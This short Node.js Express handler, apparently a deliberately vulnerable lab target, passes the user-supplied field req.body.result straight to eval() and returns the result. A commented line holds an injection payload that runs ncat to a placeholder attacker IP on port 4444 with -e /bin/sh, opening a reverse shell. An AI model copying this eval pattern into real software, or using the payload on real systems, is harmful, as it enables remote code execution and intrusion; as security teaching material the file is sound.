
exports.calculator = function(req, res){
    // console.log(req.body.result)
    // var exec = "require('child_process').execSync('ncat <IP_Masina_Atacator> 4444 -e /bin/sh')";

    var result = eval(req.body.result);

    var redir = {status: "ok",
                value: result};
    
    return res.json(redir);
}
